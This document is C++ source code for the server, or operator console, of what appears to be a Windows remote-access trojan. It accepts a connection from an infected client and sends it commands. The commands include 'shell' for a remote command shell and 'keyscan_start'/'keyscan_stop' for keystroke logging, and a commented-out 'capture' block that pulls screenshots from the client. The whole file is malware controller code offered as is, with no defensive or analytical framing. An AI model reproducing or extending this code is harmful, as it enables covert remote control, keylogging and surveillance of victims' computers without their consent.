#define _WINSOCK_DEPRECATED_NO_WARNINGS

#pragma comment(lib, "ws2_32.lib")

#include <iostream>
#include <cstdio>
#include <WinSock2.h>
#include <Windows.h>
#include <string.h>
#include <string>
#include <algorithm>
#include <fstream>

#define PORT 4454
#define PACKET_SIZE 10240

using namespace std;

HANDLE hC = GetStdHandle(STD_OUTPUT_HANDLE);

void setColor(string color)
{
    if (color.compare("red") == 0)
        SetConsoleTextAttribute(hC, FOREGROUND_RED);
    else if (color.compare("green") == 0)
        SetConsoleTextAttribute(hC, FOREGROUND_GREEN);
    else if (color.compare("default") == 0)
        SetConsoleTextAttribute(hC, FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_GREEN);
}

string status;
string running;
string cd;

int main()
{
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2), &wsaData);

    SOCKET hListen;
    hListen = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

    SOCKADDR_IN tListenAddr = {};
    tListenAddr.sin_family = AF_INET;
    tListenAddr.sin_port = htons(PORT);
    tListenAddr.sin_addr.s_addr = htonl(INADDR_ANY);
    //tListenAddr.sin_addr.s_addr = inet_addr("192.168.35.184");

    bind(hListen, (SOCKADDR*)&tListenAddr, sizeof(tListenAddr));
    listen(hListen, SOMAXCONN);

    setColor("green");
    printf("Waiting Client Side To Connect...\n");

    SOCKADDR_IN tClntAddr = {};
    int iClntSize = sizeof(tClntAddr);
    SOCKET hClient = accept(hListen, (SOCKADDR*)&tClntAddr, &iClntSize);

    char* ip_ = inet_ntoa(tClntAddr.sin_addr);
    printf("Accepted Connection from : %s\n", ip_);

    while (true)
    {
        char cBuffer[PACKET_SIZE] = {};
        recv(hClient, cBuffer, PACKET_SIZE, 0);
        printf("%s\n", cBuffer);

        char cMsg[201];
        setColor("red");
        if (status.compare("[Shell]") == 0)
        {
            char cMsg[] = "cd";
            send(hClient, cMsg, strlen(cMsg), 0);

            char cBuffer[PACKET_SIZE] = {};
            recv(hClient, cBuffer, PACKET_SIZE, 0);

            string S(cBuffer);
            S.erase(std::remove(S.begin(), S.end(), '\n'), S.end());
            cd = " ";
            cd += S;
        }
        printf("%s%s%s > ", running.c_str(), status.c_str(), cd.c_str());
        gets_s(cMsg, sizeof(cMsg));
        setColor("default");
        if (strcmp(cMsg, "exitconn") == 0) //Server wants to exit
        {
            setColor("red");
            printf("Terminating...\n");
            char exitCode[] = "-1";
            send(hClient, exitCode, strlen(exitCode), 0); //Send an exit code(-1) to Client
            closesocket(hClient);
            closesocket(hListen);
            WSACleanup();

            setColor("default");
            system("pause");
            return 0;
        }
        else if (strcmp(cMsg, "shell") == 0) //Shell
        {
            status = "[Shell]";
        }
        else if (strcmp(cMsg, "exit") == 0) //Shell
        {
            status.clear();
            cd.clear();
        }
        else if (strcmp(cMsg, "keyscan_start") == 0)
        {
            running = "[Keyscan Running] ";
        }
        else if (strcmp(cMsg, "keyscan_stop") == 0)
        {
            running.clear();
        }
        /*else if (strcmp(cMsg, "capture") == 0)
        {
            send(hClient, cMsg, strlen(cMsg), 0);

            char cBuffer[PACKET_SIZE];
            recv(hClient, cBuffer, PACKET_SIZE, 0); //receive image buffer size
            int CaptureBufferSize = atoi(cBuffer); //change char number to int
            cout << "size : " << CaptureBufferSize << endl;
            char _cMsg[] = "1";
            send(hClient, _cMsg, strlen(_cMsg), 0); //send any message to client

            char CaptureBuffer[1000001];
            recv(hClient, CaptureBuffer, sizeof(CaptureBuffer), 0);

            ofstream out;
            out.open("Capture(ServerSide).jpg", ios::binary);
            out.write(CaptureBuffer, CaptureBufferSize);
            out.close();

            char _cMsg2[] = "1";
            send(hClient, _cMsg2, strlen(_cMsg2), 0);

            continue;
        }*/

        send(hClient, cMsg, strlen(cMsg), 0);
    }

    return 0;
}
